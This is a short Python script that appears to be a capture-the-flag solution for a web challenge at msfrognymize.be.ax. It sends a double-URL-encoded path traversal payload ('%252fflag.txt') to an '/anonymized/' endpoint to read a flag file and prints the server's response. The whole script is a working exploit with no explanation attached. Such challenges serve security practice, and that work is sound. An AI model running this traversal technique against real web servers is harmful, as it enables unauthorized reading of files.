import requests

def solve(url):
    payload = r"%252fflag.txt"
    res = requests.get(url + f"/anonymized/{payload}")
    print(res.text)

def main():
    url = "https://msfrognymize.be.ax"
    solve(url)

if __name__ == "__main__":
    main()